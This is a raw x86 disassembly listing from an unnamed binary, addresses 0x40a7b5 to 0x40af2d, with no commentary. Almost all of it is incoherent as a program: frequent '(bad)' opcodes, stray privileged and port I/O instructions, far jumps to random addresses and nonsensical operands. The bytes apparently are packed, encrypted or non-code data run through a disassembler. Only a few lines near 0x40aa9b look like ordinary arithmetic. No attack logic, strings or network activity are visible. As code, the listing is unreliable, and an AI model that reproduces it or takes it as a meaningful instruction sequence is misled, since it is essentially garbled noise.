  40a7b5:	and    eax,0x58cfe5d2
  40a7ba:	rcl    ch,1
  40a7bc:	div    dh
  40a7be:	sbb    esi,DWORD PTR [edx-0x7a]
  40a7c1:	sub    al,0xdf
  40a7c3:	jmp    0xa4e3bea7
  40a7c8:	sub    cl,BYTE PTR [ebx]
  40a7ca:	ins    BYTE PTR es:[edi],dx
  40a7cb:	xor    DWORD PTR [ebx],0xfffffff7
  40a7ce:	fisubr DWORD PTR ds:0x5c754dce
  40a7d4:	scas   eax,DWORD PTR es:[edi]
  40a7d5:	(bad)
  40a7d9:	lock popf 
  40a7db:	rcl    BYTE PTR [ebx-0x60],1
  40a7de:	add    eax,0xc36d2682
  40a7e3:	sub    BYTE PTR [ecx],ah
  40a7e5:	xor    DWORD PTR [ebx-0x73],esi
  40a7e8:	xchg   ecx,eax
  40a7e9:	jbe    0x40a806
  40a7eb:	inc    esp
  40a7ec:	js     0x40a863
  40a7ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ef:	push   edi
  40a7f0:	fsubrp st(2),st
  40a7f2:	xor    ebx,DWORD PTR [ebp-0x4d]
  40a7f5:	dec    esi
  40a7f6:	mov    bh,0xa8
  40a7f8:	and    ch,BYTE PTR [ebp+0x15]
  40a7fb:	jp     0x40a865
  40a7fd:	js     0x40a7fb
  40a7ff:	dec    esi
  40a800:	inc    ebp
  40a801:	(bad)  
  40a802:	jle    0x40a848
  40a804:	xor    BYTE PTR [ecx],dh
  40a806:	in     eax,dx
  40a807:	mov    ebp,0x52957a42
  40a80c:	cwde   
  40a80d:	mov    ecx,0x55465f7
  40a812:	dec    ebx
  40a813:	push   ecx
  40a814:	addr16 jl 0x40a848
  40a817:	aad    0xd9
  40a819:	pop    ss
  40a81a:	retf   
  40a81b:	iret   
  40a81c:	iret   
  40a81d:	xor    DWORD PTR [eax-0x50bdce],eax
  40a823:	sub    BYTE PTR [eax],0x4d
  40a826:	pusha  
  40a827:	fisub  WORD PTR [ecx+0x250738e2]
  40a82d:	inc    ecx
  40a82e:	mov    al,0x33
  40a830:	dec    DWORD PTR [eax]
  40a832:	xor    dh,BYTE PTR [edx-0x48]
  40a835:	fldcw  WORD PTR [ecx+0x617e9d49]
  40a83b:	std    
  40a83c:	or     cl,BYTE PTR [ebp+0x18]
  40a83f:	jmp    0x8cfaf220
  40a844:	xchg   BYTE PTR [ecx],ah
  40a846:	scas   eax,DWORD PTR es:[edi]
  40a847:	jge    0x40a898
  40a849:	loopne 0x40a87a
  40a84b:	mov    al,ds:0x93274438
  40a850:	(bad)  
  40a851:	mov    dl,0xd8
  40a853:	int3   
  40a854:	cs mov ebp,edi
  40a857:	sbb    bh,al
  40a859:	test   dl,cl
  40a85b:	mov    WORD PTR [eax+edx*2],ss
  40a85e:	mov    edi,0x7f167519
  40a863:	mov    ds:0xd1a404d9,eax
  40a868:	sbb    al,0xf0
  40a86a:	into   
  40a86b:	call   DWORD PTR [esi]
  40a86d:	(bad)  
  40a86e:	jecxz  0x40a891
  40a870:	push   edi
  40a871:	cmp    dl,BYTE PTR [ecx]
  40a873:	lock or DWORD PTR [ebx+0x746db614],eax
  40a87a:	or     al,0x28
  40a87c:	lds    ecx,FWORD PTR [esi-0x7e]
  40a87f:	sub    BYTE PTR [ebp+0x5068113d],ah
  40a885:	pop    esp
  40a886:	data16 cli 
  40a888:	cli    
  40a889:	sub    ch,al
  40a88b:	dec    edi
  40a88c:	arpl   WORD PTR [esi-0x7dcba3d5],sp
  40a892:	shr    DWORD PTR [ebp+ebp*2-0x3f],0x2b
  40a897:	test   eax,0xb4feec70
  40a89c:	and    edx,DWORD PTR [eax+0x55bb825a]
  40a8a2:	mov    ch,0x92
  40a8a4:	test   BYTE PTR [ebp+eax*8-0x6],bh
  40a8a8:	(bad)  
  40a8a9:	in     al,dx
  40a8aa:	inc    edx
  40a8ab:	dec    eax
  40a8ac:	fdiv   QWORD PTR [ebx]
  40a8ae:	sbb    bl,0x6e
  40a8b1:	mov    DWORD PTR [edi+0x5b],esp
  40a8b4:	add    BYTE PTR [edi],0x96
  40a8b7:	out    dx,al
  40a8b8:	out    dx,eax
  40a8b9:	fsubr  QWORD PTR ds:0x4e2f6a1e
  40a8bf:	icebp  
  40a8c0:	jecxz  0x40a87b
  40a8c2:	ins    BYTE PTR es:[edi],dx
  40a8c3:	in     eax,dx
  40a8c4:	and    al,0x71
  40a8c6:	fist   WORD PTR [ebp+0x1bc1ae50]
  40a8cc:	call   0x7950:0x7a87436c
  40a8d3:	out    0x97,al
  40a8d5:	xlat   BYTE PTR ds:[ebx]
  40a8d6:	mov    eax,ds:0x5ad890a3
  40a8db:	and    BYTE PTR fs:[eax-0x6a],ah
  40a8df:	push   es
  40a8e0:	inc    ecx
  40a8e1:	pushf  
  40a8e2:	sar    BYTE PTR [edx],0x38
  40a8e5:	sub    edx,DWORD PTR [ebx+0x75]
  40a8e8:	push   ss
  40a8e9:	cmp    ecx,DWORD PTR [edi]
  40a8eb:	mov    bh,0xb1
  40a8ed:	aaa    
  40a8ee:	xor    eax,0xad4e051b
  40a8f3:	fsubrp st(4),st
  40a8f5:	inc    DWORD PTR [eax+0x1d]
  40a8f8:	mov    edx,0xeef1fe64
  40a8fd:	cmp    ebp,esp
  40a8ff:	pop    ss
  40a900:	xchg   esi,eax
  40a901:	xchg   esi,eax
  40a902:	mov    WORD PTR [esi+0x67],ds
  40a905:	pop    edi
  40a906:	adc    eax,0xfd1006d9
  40a90b:	mov    edi,0x9630ed34
  40a910:	sahf   
  40a911:	pop    ecx
  40a912:	jecxz  0x40a8a7
  40a914:	(bad)  
  40a915:	shr    DWORD PTR [ebp+0x4563d1be],cl
  40a91b:	nop
  40a91c:	push   ecx
  40a91d:	dec    esi
  40a91e:	mov    edx,0x496d92e1
  40a923:	scas   eax,DWORD PTR es:[edi]
  40a924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a925:	adc    BYTE PTR ds:0x690c6681,0x80
  40a92c:	or     eax,0xc28df7e1
  40a931:	icebp  
  40a932:	(bad)  
  40a933:	cmp    DWORD PTR [edi-0x7faff51b],eax
  40a939:	push   esi
  40a93a:	cmc    
  40a93b:	fdivr  QWORD PTR [ecx+ebp*4+0x401abf01]
  40a942:	xor    ecx,DWORD PTR [eax]
  40a944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a945:	cdq    
  40a946:	adc    eax,0x8d06c191
  40a94b:	inc    edi
  40a94c:	gs pop edi
  40a94e:	xchg   ebx,eax
  40a94f:	jne    0x40a8d5
  40a951:	mov    ds:0x2b0c8bad,eax
  40a956:	gs repnz push 0xe67e19e8
  40a95d:	and    eax,0x1ba7e5e8
  40a962:	inc    ebx
  40a963:	jl     0x40a9be
  40a965:	push   ds
  40a966:	dec    esi
  40a967:	sbb    ah,BYTE PTR [edx+0x53]
  40a96a:	(bad)  
  40a96b:	in     al,dx
  40a96c:	lods   eax,DWORD PTR ds:[esi]
  40a96d:	cmp    BYTE PTR [edi-0x18],ah
  40a970:	dec    edx
  40a971:	adc    ecx,DWORD PTR ds:0x79980735
  40a977:	enter  0x970d,0xf3
  40a97b:	leave  
  40a97c:	mov    esi,ecx
  40a97e:	repz mov ds:0xafd9ca5b,eax
  40a984:	inc    ebx
  40a985:	jb     0x40a969
  40a987:	xchg   ecx,eax
  40a988:	rcr    ebx,0xa4
  40a98b:	inc    esp
  40a98c:	pop    ds
  40a98d:	popf   
  40a98e:	mov    dh,0x1
  40a990:	test   eax,0x1ec27066
  40a995:	jle    0x40a950
  40a997:	icebp  
  40a998:	mov    eax,0xe415e464
  40a99d:	test   DWORD PTR [edx+0x61abbd9d],eax
  40a9a3:	adc    al,BYTE PTR [ebp-0x5e]
  40a9a6:	jp     0x40a9f8
  40a9a8:	sti    
  40a9a9:	cmp    eax,0x31e78645
  40a9ae:	aam    0x99
  40a9b0:	ins    DWORD PTR es:[edi],dx
  40a9b1:	mov    ah,0xbf
  40a9b3:	dec    edi
  40a9b4:	xor    BYTE PTR [ecx+eax*8+0x3b],dl
  40a9b8:	(bad)  
  40a9b9:	or     ebx,ecx
  40a9bb:	pop    eax
  40a9bc:	(bad)  
  40a9be:	xchg   esp,eax
  40a9bf:	sbb    eax,0x9e6c7c47
  40a9c4:	call   0x39137906
  40a9c9:	inc    ecx
  40a9ca:	int    0x55
  40a9cc:	or     DWORD PTR [ebx-0x70],ebx
  40a9cf:	hlt    
  40a9d0:	cmp    ch,bh
  40a9d2:	ret    
  40a9d3:	jno    0x40aa54
  40a9d5:	ins    DWORD PTR es:[edi],dx
  40a9d6:	mov    edx,DWORD PTR [edi]
  40a9d8:	imul   ebp,DWORD PTR [edi-0x8],0xffffffc6
  40a9dc:	xor    DWORD PTR [eax-0x3e18e0d5],ebp
  40a9e2:	mov    ds:0x6edeae89,al
  40a9e7:	je     0x40aa0b
  40a9e9:	xchg   ebx,eax
  40a9ea:	xlat   BYTE PTR ds:[ebx]
  40a9eb:	add    al,0x2b
  40a9ed:	stos   BYTE PTR es:[edi],al
  40a9ee:	xchg   ebx,eax
  40a9ef:	stc    
  40a9f0:	xchg   ebx,esp
  40a9f2:	jbe    0x40a9dc
  40a9f4:	call   0x9c00:0x7fb15bb9
  40a9fb:	(bad)  
  40a9fc:	sub    DWORD PTR [edi],eax
  40a9fe:	pop    ebx
  40a9ff:	addr16 call 0x82051bd5
  40aa05:	sar    BYTE PTR [ebx+0x4d],0x10
  40aa09:	xchg   ebp,eax
  40aa0a:	adc    DWORD PTR [esi+0x6],ecx
  40aa0d:	js     0x40aa87
  40aa0f:	sbb    esi,ebx
  40aa11:	mov    cl,0x56
  40aa13:	push   eax
  40aa14:	xchg   edx,eax
  40aa15:	push   edx
  40aa16:	or     BYTE PTR cs:[ecx+edi*8-0x3a],bh
  40aa1b:	aaa    
  40aa1c:	mov    DWORD PTR [edx+edx*8-0x76],ebx
  40aa20:	inc    ecx
  40aa21:	shr    BYTE PTR [esi-0x48],cl
  40aa24:	mov    ds:0x186a0855,al
  40aa29:	push   esp
  40aa2a:	cmp    DWORD PTR [edi-0x12d49c3f],0x5e
  40aa31:	jbe    0x40aa53
  40aa33:	out    dx,eax
  40aa34:	div    BYTE PTR [eax+0x5fe6d9b8]
  40aa3a:	and    eax,0xcc8f02da
  40aa3f:	jmp    0x40aa6e
  40aa41:	clc    
  40aa42:	test   al,0x69
  40aa44:	jns    0x40a9ca
  40aa46:	pop    es
  40aa47:	mov    eax,ds:0xd49283cd
  40aa4c:	push   es
  40aa4d:	int    0x38
  40aa4f:	inc    edi
  40aa50:	fld    TBYTE PTR [ebp+0x9]
  40aa53:	retf   
  40aa54:	scas   al,BYTE PTR es:[edi]
  40aa55:	loope  0x40aa8c
  40aa57:	jno    0x40aa5d
  40aa59:	sbb    ecx,DWORD PTR [edx-0x25]
  40aa5c:	jae    0x40aa59
  40aa5e:	int    0xc5
  40aa60:	and    cl,BYTE PTR [edi+0x73b95fa]
  40aa66:	adc    BYTE PTR [edi+esi*1],bh
  40aa69:	dec    edi
  40aa6a:	pop    ds
  40aa6b:	mov    ebp,0x87e78793
  40aa70:	stc    
  40aa71:	inc    esp
  40aa72:	xor    ah,BYTE PTR [ebx-0x3c]
  40aa75:	and    al,0x4b
  40aa77:	scas   eax,DWORD PTR es:[edi]
  40aa78:	lods   al,BYTE PTR ds:[esi]
  40aa79:	inc    edx
  40aa7a:	and    eax,0x890652fb
  40aa7f:	mov    ebx,0xfdfce739
  40aa84:	(bad)  
  40aa85:	sbb    dl,dh
  40aa87:	sbb    ebp,DWORD PTR [esp+esi*1-0x4f]
  40aa8b:	test   DWORD PTR [ebx+0x338c0a85],ebp
  40aa91:	sar    DWORD PTR [edx+0x3272db],0x3
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xdd70fcbc
  40aacc:	bound  edx,QWORD PTR [esp+esi*8+0x62]
  40aad0:	bound  edx,QWORD PTR [eax]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x3]
  40aad6:	or     BYTE PTR [edx-0x2e4d12aa],al
  40aadc:	iret   
  40aadd:	lods   al,BYTE PTR ds:[esi]
  40aade:	push   esp
  40aadf:	retf   
  40aae0:	cmp    ebx,DWORD PTR [esi-0x7e]
  40aae3:	xor    BYTE PTR [ebx-0x24097f78],ah
  40aae9:	dec    edi
  40aaea:	lock jp 0x40aa87
  40aaed:	ret    0x100c
  40aaf0:	adc    eax,0x161f4e86
  40aaf5:	stos   BYTE PTR es:[edi],al
  40aaf6:	xor    eax,0x16c0ef77
  40aafb:	les    ebx,FWORD PTR [edx+0x13]
  40aafe:	mov    DWORD PTR [esi],0x11e1e07e
  40ab04:	mov    edi,DWORD PTR es:[edx+0x2bec250b]
  40ab0b:	jbe    0x40aad0
  40ab0d:	jne    0x40ab2f
  40ab0f:	cmp    bh,cl
  40ab11:	mov    cl,0xdd
  40ab13:	cld    
  40ab14:	leave  
  40ab15:	xchg   edx,eax
  40ab16:	loope  0x40aae0
  40ab18:	xor    DWORD PTR [edx+ebp*2+0x51],0x3298b0dc
  40ab20:	add    BYTE PTR [edi+0x28e09820],0x6c
  40ab27:	pop    edi
  40ab28:	jnp    0x40aad4
  40ab2a:	aam    0xd2
  40ab2c:	sub    dh,BYTE PTR [esi-0x1ef3b741]
  40ab32:	in     al,dx
  40ab33:	push   edi
  40ab34:	add    BYTE PTR [ecx+0x5881b482],cl
  40ab3a:	or     DWORD PTR [bp+si-0x30],edx
  40ab3e:	repnz ins BYTE PTR es:[edi],dx
  40ab40:	fild   QWORD PTR [ebp-0x52665f45]
  40ab46:	push   ds
  40ab47:	xchg   edx,eax
  40ab48:	jae    0x40aad3
  40ab4a:	shld   DWORD PTR [edx+0x33aaf4c7],esi,cl
  40ab51:	cmp    BYTE PTR [ecx+0x3c8628b5],cl
  40ab57:	ret    0x7d1b
  40ab5a:	mov    ds:0xe5274e16,eax
  40ab5f:	adc    DWORD PTR [ecx],edx
  40ab61:	xor    BYTE PTR [edx],cl
  40ab63:	jne    0x40ab2d
  40ab65:	popa   
  40ab66:	pop    ecx
  40ab67:	loope  0x40ab94
  40ab69:	xor    eax,0x6da04a3e
  40ab6e:	test   al,0xb2
  40ab70:	dec    ecx
  40ab71:	inc    eax
  40ab72:	jmp    0xe32b:0x30777ea5
  40ab79:	cs pop eax
  40ab7b:	mov    al,fs:0x150f3ad9
  40ab81:	in     eax,0xf3
  40ab83:	inc    eax
  40ab84:	dec    ebx
  40ab85:	shr    DWORD PTR [esi+0x2a8e0fec],1
  40ab8b:	pop    ebp
  40ab8c:	or     DWORD PTR [ebp+0x24],edi
  40ab8f:	sbb    eax,0xc4daddc9
  40ab94:	mov    bl,0x4c
  40ab96:	test   BYTE PTR [esi],cl
  40ab98:	mov    eax,ds:0x661f4a66
  40ab9d:	mov    WORD PTR [ecx+edi*2],ds
  40aba0:	add    BYTE PTR [ecx-0x6fbaf248],bh
  40aba6:	adc    DWORD PTR [eax+0x2e],esi
  40aba9:	jle    0x40ab44
  40abab:	ror    ecx,0xea
  40abae:	xor    edx,DWORD PTR [ebx]
  40abb0:	jae    0x40ab9b
  40abb2:	mov    cl,cl
  40abb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abb5:	ffreep st(5)
  40abb7:	imul   edi,DWORD PTR [ecx+0x667bf3af],0x99207620
  40abc1:	mov    bl,0xdf
  40abc3:	ins    DWORD PTR es:[edi],dx
  40abc4:	ja     0x40ac1f
  40abc6:	imul   ebp,DWORD PTR [ebx+ecx*1+0x40],0x28ae481
  40abce:	push   ecx
  40abcf:	lahf   
  40abd0:	push   ds
  40abd1:	jae    0x40ab83
  40abd3:	sub    ah,bh
  40abd5:	adc    esi,edx
  40abd7:	gs dec ecx
  40abd9:	mov    ecx,0x67cb2c89
  40abde:	sub    ecx,edx
  40abe0:	push   eax
  40abe1:	ficomp DWORD PTR [edi+0x45c3298a]
  40abe7:	fnstcw WORD PTR [ecx]
  40abe9:	sahf   
  40abea:	jns    0x40abc2
  40abec:	xchg   edx,eax
  40abed:	fist   DWORD PTR ds:0xdc3977c1
  40abf3:	and    ah,BYTE PTR [ebp+0x56]
  40abf6:	mov    edi,0xd9ae9ddb
  40abfb:	mov    bl,0x90
  40abfd:	or     al,0xf0
  40abff:	(bad)  
  40ac00:	mov    bh,0xfd
  40ac02:	mov    ebp,0x8f9e9b82
  40ac07:	jne    0x40ac68
  40ac09:	inc    eax
  40ac0a:	inc    ebp
  40ac0b:	lods   eax,DWORD PTR ds:[esi]
  40ac0c:	mov    WORD PTR [ebx+0x265baa37],?
  40ac12:	sub    DWORD PTR [edi],esi
  40ac14:	push   esi
  40ac15:	dec    edx
  40ac16:	xchg   edi,eax
  40ac17:	cmp    DWORD PTR [ebp-0x2e],esi
  40ac1a:	push   ss
  40ac1b:	(bad)  
  40ac1c:	call   0xeab2:0xdf38857c
  40ac23:	xor    eax,eax
  40ac25:	cmp    eax,0x3cb72583
  40ac2a:	adc    dl,BYTE PTR [esi-0x36]
  40ac2d:	jo     0x40abd8
  40ac2f:	inc    eax
  40ac30:	mov    eax,ds:0xc4a1a689
  40ac35:	rcr    BYTE PTR [esi-0x7a],1
  40ac38:	test   DWORD PTR [edx+ebp*8-0x58],0xe49dd48c
  40ac40:	sub    al,0x69
  40ac42:	push   0xc7d0666d
  40ac47:	(bad)  
  40ac48:	mov    ds:0x26bcd265,eax
  40ac4d:	popa   
  40ac4e:	pop    ss
  40ac4f:	jne    0x40acb0
  40ac51:	out    dx,al
  40ac52:	(bad)  
  40ac53:	mov    ch,0x27
  40ac55:	adc    eax,0xd537a2f8
  40ac5a:	xor    esp,ebx
  40ac5c:	arpl   WORD PTR [eax+0x56],si
  40ac5f:	retf   
  40ac60:	lods   al,BYTE PTR ds:[esi]
  40ac61:	cmp    eax,0x70d286b
  40ac66:	fisubr DWORD PTR [esi+ecx*2-0x1b]
  40ac6a:	outs   dx,DWORD PTR ds:[esi]
  40ac6b:	push   esp
  40ac6c:	jnp    0x40ac7d
  40ac6e:	push   esi
  40ac6f:	cli    
  40ac70:	jno    0x40acb7
  40ac72:	xchg   esi,eax
  40ac73:	push   eax
  40ac74:	jmp    0xf1d9:0xd0c84b61
  40ac7b:	ss out dx,al
  40ac7d:	int    0x23
  40ac7f:	or     BYTE PTR [esi+ebx*4-0x49],dl
  40ac83:	mov    ds:0x70e7e117,al
  40ac88:	loope  0x40ac7e
  40ac8a:	mov    ch,0xb
  40ac8c:	xor    DWORD PTR [esi-0x17],edx
  40ac8f:	in     al,0xd7
  40ac91:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40ac93:	stc    
  40ac94:	sub    bl,BYTE PTR [ebx-0x37d21c08]
  40ac9a:	les    ebx,FWORD PTR [eax]
  40ac9c:	dec    eax
  40ac9d:	adc    DWORD PTR [esi+0x74],ebp
  40aca0:	add    eax,0x8d2fcd74
  40aca5:	outs   dx,BYTE PTR ds:[esi]
  40aca6:	cdq    
  40aca7:	fnstcw WORD PTR [eax+0xa71bcef]
  40acad:	mov    cl,0xfe
  40acaf:	mov    ebp,DWORD PTR [edi-0x4f8b5945]
  40acb5:	clc    
  40acb6:	inc    ecx
  40acb7:	sub    ch,al
  40acb9:	repz dec edx
  40acbb:	cwde   
  40acbc:	scas   eax,DWORD PTR es:[edi]
  40acbd:	sbb    al,0xf
  40acbf:	lea    edi,[ebp+0x63]
  40acc2:	and    DWORD PTR [eax-0x1759e668],eax
  40acc8:	iret   
  40acc9:	mov    al,ds:0x55b15a86
  40acce:	mov    bl,0xeb
  40acd0:	cmp    dl,dl
  40acd2:	cli    
  40acd3:	or     BYTE PTR [ecx+0x4c],ch
  40acd6:	(bad)  
  40acd7:	loopne 0x40ad3e
  40acd9:	pop    ebp
  40acda:	fldenv [ecx+ecx*1+0x1b]
  40acde:	inc    ecx
  40acdf:	(bad)  
  40ace0:	sbb    dl,BYTE PTR [ebx]
  40ace2:	push   edx
  40ace3:	cmp    ebp,DWORD PTR [esi]
  40ace5:	add    BYTE PTR [ebx],bl
  40ace7:	dec    esi
  40ace8:	add    dl,bl
  40acea:	mov    ecx,0x3e3afcc6
  40acef:	adc    al,0xbe
  40acf1:	ins    DWORD PTR es:[edi],dx
  40acf2:	cmp    BYTE PTR [edx],ch
  40acf4:	(bad)  
  40acf5:	xlat   BYTE PTR ds:[ebx]
  40acf6:	bound  eax,QWORD PTR [ebp-0x9b70f4c]
  40acfc:	dec    edx
  40acfd:	ds icebp 
  40acff:	push   ebp
  40ad00:	cld    
  40ad01:	or     dl,BYTE PTR gs:[eax+0x69db7ee3]
  40ad08:	adc    esi,DWORD PTR [ebx+0x66b7ee48]
  40ad0e:	push   0xe5e59959
  40ad13:	mov    ecx,0x4e64501c
  40ad18:	int3   
  40ad19:	jo     0x40ad82
  40ad1b:	gs dec ecx
  40ad1d:	mov    eax,0x89364b02
  40ad22:	retf   0xa92
  40ad25:	leave  
  40ad26:	sub    al,0x61
  40ad28:	xchg   edx,eax
  40ad29:	loop   0x40ad8e
  40ad2b:	stos   DWORD PTR es:[edi],eax
  40ad2c:	xchg   ebx,eax
  40ad2d:	jmp    0x40acb7
  40ad2f:	jmp    DWORD PTR [ecx-0x78]
  40ad32:	cwde   
  40ad33:	and    esp,DWORD PTR [esi]
  40ad35:	mov    cl,0x5b
  40ad37:	add    BYTE PTR [edx+0x21e587e7],0xf4
  40ad3e:	call   0x9744d013
  40ad43:	mov    al,ds:0xfddeb20f
  40ad48:	push   ds
  40ad49:	jmp    0x48e:0x8733cddf
  40ad50:	xchg   edx,eax
  40ad51:	xor    al,0x5e
  40ad53:	xor    ebx,esp
  40ad55:	scas   eax,DWORD PTR es:[edi]
  40ad56:	jo     0x40ad6e
  40ad58:	jge    0x40ad18
  40ad5a:	mov    ebx,0x9d5783f0
  40ad5f:	gs popf 
  40ad61:	inc    ecx
  40ad62:	lds    eax,FWORD PTR [esi]
  40ad64:	popa   
  40ad65:	pop    esi
  40ad66:	jo     0x40add3
  40ad68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad69:	cmp    cl,dl
  40ad6b:	xor    al,0xd3
  40ad6d:	pop    edx
  40ad6e:	xchg   ecx,eax
  40ad6f:	in     eax,dx
  40ad70:	adc    al,0x94
  40ad72:	test   BYTE PTR [ecx+0x113d0a5d],bl
  40ad78:	mov    ebx,0xa3bed4eb
  40ad7d:	sti    
  40ad7e:	int3   
  40ad7f:	mov    cl,0xb7
  40ad81:	outs   dx,BYTE PTR ds:[esi]
  40ad82:	sub    esi,DWORD PTR [esi-0x7]
  40ad85:	pop    ecx
  40ad86:	mov    eax,ds:0xd65e9860
  40ad8b:	test   cl,bh
  40ad8d:	adc    DWORD PTR [edx+0x7c],ecx
  40ad90:	(bad)  
  40ad91:	(bad)  
  40ad92:	imul   ebp,DWORD PTR [ebp+0x29ead71b],0xffffffbf
  40ad99:	(bad)  
  40ad9a:	int3   
  40ad9b:	aas    
  40ad9c:	popf   
  40ad9d:	shl    BYTE PTR [edx-0x3314873],0x5
  40ada4:	mov    ah,0x10
  40ada6:	mov    bh,0x8
  40ada8:	sar    BYTE PTR [esi+0x7ba681f1],cl
  40adae:	jo     0x40adbd
  40adb0:	mov    ebp,0x3309dc6e
  40adb5:	aad    0x46
  40adb7:	xor    DWORD PTR [ebx+0x39],edx
  40adba:	adc    BYTE PTR ds:0x467fad00,bh
  40adc0:	push   esp
  40adc1:	hlt    
  40adc2:	fisttp WORD PTR [edi-0x2df34523]
  40adc8:	add    BYTE PTR [esi-0x75],bh
  40adcb:	jge    0x40ae2d
  40adcd:	in     al,dx
  40adce:	arpl   WORD PTR [esi+0x69e21d32],sp
  40add4:	in     al,dx
  40add5:	sub    DWORD PTR [eax-0x22903b89],0xffffffa1
  40addc:	(bad)  
  40addd:	outs   dx,BYTE PTR ds:[esi]
  40adde:	call   0x34bb:0x546c00b8
  40ade5:	push   es
  40ade6:	inc    edi
  40ade7:	sbb    al,0x3b
  40ade9:	retf   
  40adea:	scas   eax,DWORD PTR es:[edi]
  40adeb:	cli    
  40adec:	mov    DWORD PTR [ebp+0x32646c50],0xaa54edd4
  40adf6:	imul   edx,DWORD PTR [eax-0x52],0xffffffe6
  40adfa:	stc    
  40adfb:	outs   dx,BYTE PTR ds:[esi]
  40adfc:	jmp    FWORD PTR [edi]
  40adfe:	lahf   
  40adff:	(bad)  
  40ae00:	jl     0x40ae30
  40ae02:	ss push ecx
  40ae04:	mov    dl,0x67
  40ae06:	sar    bl,cl
  40ae08:	push   cs
  40ae09:	xor    dl,bl
  40ae0b:	add    esp,DWORD PTR [ebp+0x4a1b161c]
  40ae11:	sub    al,0xdc
  40ae13:	add    dl,ah
  40ae15:	pop    edx
  40ae16:	aam    0x47
  40ae18:	pop    edx
  40ae19:	sub    DWORD PTR [eax-0x245f73f1],edi
  40ae1f:	add    DWORD PTR [ebp-0x545a1580],ecx
  40ae25:	(bad)  
  40ae26:	xor    BYTE PTR [edx+0x1e1bdb6b],bh
  40ae2c:	dec    edi
  40ae2d:	jne    0x40ae00
  40ae2f:	inc    ebx
  40ae30:	dec    esp
  40ae31:	ret    0xae6a
  40ae34:	inc    ebp
  40ae35:	aaa    
  40ae36:	and    al,al
  40ae38:	jp     0x40ae44
  40ae3a:	pop    ebx
  40ae3b:	(bad)  
  40ae3c:	div    DWORD PTR ds:0x2b6309a2
  40ae42:	xor    cl,ch
  40ae44:	in     eax,dx
  40ae45:	pop    eax
  40ae46:	inc    ecx
  40ae47:	icebp  
  40ae48:	inc    ebp
  40ae49:	test   ch,0xdb
  40ae4c:	jl     0x40ae7f
  40ae4e:	push   es
  40ae4f:	mov    ebp,0x935ce09f
  40ae54:	cmp    ebp,DWORD PTR [ecx]
  40ae56:	push   ebx
  40ae57:	je     0x40adf6
  40ae59:	adc    al,0x8d
  40ae5b:	dec    esp
  40ae5c:	enter  0xdb6e,0xce
  40ae60:	sbb    ebp,DWORD PTR ds:0x6c29d49
  40ae66:	mov    ds:0x23f04600,eax
  40ae6b:	sti    
  40ae6c:	pop    ebx
  40ae6d:	fimul  WORD PTR [edx-0x3954709c]
  40ae73:	retf   
  40ae74:	fwait
  40ae75:	sbb    al,0xee
  40ae77:	push   ss
  40ae78:	xchg   esp,eax
  40ae79:	jnp    0x40ae6e
  40ae7b:	out    0x58,al
  40ae7d:	adc    bl,BYTE PTR [ebx+esi*2]
  40ae80:	aas    
  40ae81:	xchg   ecx,eax
  40ae82:	loope  0x40aeea
  40ae84:	sub    ecx,ebp
  40ae86:	icebp  
  40ae87:	les    esp,FWORD PTR [esi+ebx*8]
  40ae8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae8b:	ds sti 
  40ae8d:	imul   edx,DWORD PTR [esi-0x64ecbe29],0x7
  40ae94:	adc    eax,0xe11b84b7
  40ae99:	fwait
  40ae9a:	out    0x4,al
  40ae9c:	aam    0x1d
  40ae9e:	and    BYTE PTR ds:0x89e57b0e,dh
  40aea4:	mov    DWORD PTR [edi],ebp
  40aea6:	pop    es
  40aea7:	pop    esp
  40aea8:	add    al,0x83
  40aeaa:	repnz push ss
  40aeac:	jno    0x40aec7
  40aeae:	push   edx
  40aeaf:	inc    ecx
  40aeb0:	pushw  es
  40aeb2:	cmp    al,0xce
  40aeb4:	jge    0x40ae8a
  40aeb6:	out    dx,eax
  40aeb7:	dec    ebp
  40aeb8:	adc    eax,0xa5ed2d65
  40aebd:	mov    ebp,0x537bf32d
  40aec2:	sbb    DWORD PTR [ebp+0x30b07d2c],esp
  40aec8:	sbb    eax,0x78e6a849
  40aecd:	or     ecx,DWORD PTR [eax]
  40aecf:	jmp    0x6d1a:0xfb3dcf0e
  40aed6:	sbb    eax,eax
  40aed8:	jmp    0x43912e07
  40aedd:	fistp  QWORD PTR [esi-0x67]
  40aee0:	ja     0x40aef9
  40aee2:	in     al,0x2d
  40aee4:	fmul   DWORD PTR [eax]
  40aee6:	into   
  40aee7:	test   DWORD PTR [esi],0xe3a07e9f
  40aeed:	les    esp,FWORD PTR [ebx-0xe]
  40aef0:	ror    DWORD PTR [ebx-0x51],1
  40aef3:	stos   BYTE PTR es:[edi],al
  40aef4:	test   DWORD PTR [eax-0x47],0x2e99caa8
  40aefb:	add    cl,BYTE PTR [esp+esi*2-0x1fc8328b]
  40af02:	int    0x66
  40af04:	jg     0x40af0d
  40af06:	mov    ecx,0x9e271458
  40af0b:	xchg   ebp,eax
  40af0c:	mov    BYTE PTR [edi],ah
  40af0e:	dec    edx
  40af0f:	xlat   BYTE PTR ds:[ebx]
  40af10:	inc    ecx
  40af11:	repz ror DWORD PTR [ebx],1
  40af14:	int3   
  40af15:	in     eax,0xb2
  40af17:	jbe    0x40af1b
  40af19:	data16 icebp 
  40af1b:	mov    ecx,0x3e454270
  40af20:	sar    DWORD PTR [ecx],0x72
  40af23:	shl    DWORD PTR [eax+0xe149ea3],cl
  40af29:	ds sub edx,edx
  40af2c:	push   es
  40af2d:	fwait
